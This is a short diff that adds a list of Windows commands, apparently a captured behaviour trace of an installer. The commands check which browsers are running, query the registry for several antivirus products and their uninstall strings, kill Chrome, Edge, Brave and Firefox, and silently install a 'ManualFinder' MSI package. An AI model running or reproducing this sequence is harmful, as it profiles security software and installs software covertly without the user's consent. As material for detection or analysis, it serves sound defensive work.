@@ -1,1 +1,21 @@
-
+powershell.exe Get-WmiObject Win32_Process | Where-Object { $_.Name -eq 'chrome.exe'  }
+powershell.exe Get-WmiObject Win32_Process | Where-Object { $_.Name -eq 'msedge.exe'  }
+powershell.exe Get-WmiObject Win32_Process | Where-Object { $_.Name -eq 'firefox.exe'  }
+powershell.exe Get-WmiObject Win32_Process | Where-Object { $_.Name -eq 'brave.exe'  }
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Bitdefender /v UninstallString
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall\Bitdefender /v UninstallString
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall\{96A251BD-7532-4CF9-B87D-158FC685DBC4} /v UninstallString
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\REC /v UninstallString
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\G DATA ANTIVIRUS /v UninstallString
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{4073CD02-7996-48D7-AFDF-297676C27CA6} /v UninstallString
+reg query HKLM\Software\Classes\G DATA ANTIVIRUS
+reg query HKCU\Software\CheckPoint\ZANG
+reg query HKCU\Software\KasperskyLabSetup
+reg query HKLM\Software\Fortinet
+reg query HKCU\Software\Zillya\Zillya Antivirus
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\EPISoftware EpiBrowser /v UninstallString
+taskkill /IM msedge.exe
+taskkill /IM chrome.exe
+taskkill /IM brave.exe
+taskkill /IM firefox.exe
+msiexec /qn /i ManualFinder-v2.0.196.msi
